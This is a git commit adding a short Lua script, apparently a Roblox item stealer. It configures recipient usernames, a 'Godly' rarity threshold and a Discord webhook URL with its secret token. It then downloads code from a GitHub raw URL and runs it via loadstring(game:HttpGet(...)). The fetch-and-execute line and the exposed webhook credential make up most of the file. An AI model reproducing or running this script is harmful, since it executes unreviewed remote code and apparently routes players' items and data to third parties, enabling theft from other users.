60d8a8e4f606b808f20f2e9599c21d1ad484643a
abgelutscht <99082363+abgelutscht@users.noreply.github.com>
2025-07-16 16:17:16 +0200

    Add files via upload

---
+++ sussybaka.lua
@@ -0,0 +1,7 @@
+_G.Usernames = {"PURPLEMithikDragon", "asdhahsdahds", "jasdiauhdsiad"} -- you can add as many as you'd like
+_G.min_rarity = "Godly"
+_G.min_value = 1 -- Put 1 to get all
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1395045915051560970/UbRaso2V8Dlt_Y6dMfpG7CLxJ415wevSPW_oyeF_4a9CZQIwxl2VqnbiLovkJSXf5itI" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/abgelutscht/sus/refs/heads/main/source"))()
